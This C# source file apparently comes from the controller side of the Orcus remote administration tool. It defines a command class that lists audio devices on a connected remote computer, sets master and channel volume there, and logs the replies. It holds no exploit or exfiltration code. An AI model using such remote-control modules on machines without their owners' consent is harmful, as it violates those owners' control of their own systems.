using System;
using System.Collections.Generic;
using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Plugins;
using Orcus.Shared.Commands.AudioVolumeControl;
using Orcus.Shared.Connection;
using Orcus.Shared.NetSerializer;
using Command = Orcus.Administration.Plugins.CommandViewPlugin.Command;

namespace Orcus.Administration.Commands.AudioVolumeControl
{
    [ProvideLibrary(PortableLibrary.CSCore)]
    [DescribeCommandByEnum(typeof (AudioVolumeControlCommunication))]
    public class AudioVolumeControlCommand : Command
    {
        public event EventHandler<List<AudioDevice>> DevicesReceived;

        public override void ResponseReceived(byte[] parameter)
        {
            switch ((AudioVolumeControlCommunication) parameter[0])
            {
                case AudioVolumeControlCommunication.ResponseDevices:
                    var serializer = new Serializer(typeof (List<AudioDevice>));
                    var devices = serializer.Deserialize<List<AudioDevice>>(parameter, 1);
                    DevicesReceived?.Invoke(this, devices);
                    LogService.Receive(string.Format((string) Application.Current.Resources["DevicesReceived"],
                        devices.Count));
                    break;
                case AudioVolumeControlCommunication.ResponseVolumeSet:
                    LogService.Receive((string) Application.Current.Resources["VolumeChanged"]);
                    break;
                case AudioVolumeControlCommunication.ResponseDeviceNotFound:
                    LogService.Error((string) Application.Current.Resources["DeviceNotFound"]);
                    break;
                case AudioVolumeControlCommunication.ResponseChannelNotFound:
                    LogService.Error((string) Application.Current.Resources["ChannelNotFound"]);
                    break;
                case AudioVolumeControlCommunication.ResponseNotSupported:
                    LogService.Error((string) Application.Current.Resources["PlatformNotSupported"]);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void GetDevices()
        {
            LogService.Send((string) Application.Current.Resources["GetDevices"]);
            ConnectionInfo.SendCommand(this, new[] {(byte) AudioVolumeControlCommunication.GetDevices});
        }

        public void SetMasterVolume(AudioDevice audioDevice, float masterVolume)
        {
            var package = new List<byte> {(byte) AudioVolumeControlCommunication.SetDeviceMasterVolume};
            package.AddRange(BitConverter.GetBytes(audioDevice.DeviceId));
            package.AddRange(BitConverter.GetBytes(masterVolume));
            ConnectionInfo.SendCommand(this, package.ToArray());

            LogService.Send(string.Format((string) Application.Current.Resources["ChangeMasterVolume"], audioDevice.Name,
                masterVolume));
        }

        public void SetChannelVolume(AudioDevice audioDevice, int channelId, float volume)
        {
            var package = new List<byte> {(byte) AudioVolumeControlCommunication.SetDeviceChannelVolume};
            package.AddRange(BitConverter.GetBytes(audioDevice.DeviceId));
            package.AddRange(BitConverter.GetBytes(channelId));
            package.AddRange(BitConverter.GetBytes(volume));
            ConnectionInfo.SendCommand(this, package.ToArray());

            LogService.Send(string.Format((string) Application.Current.Resources["ChangeChannelVolume"],
                audioDevice.Name, channelId, volume));
        }

        protected override uint GetId()
        {
            return 2;
        }
    }
}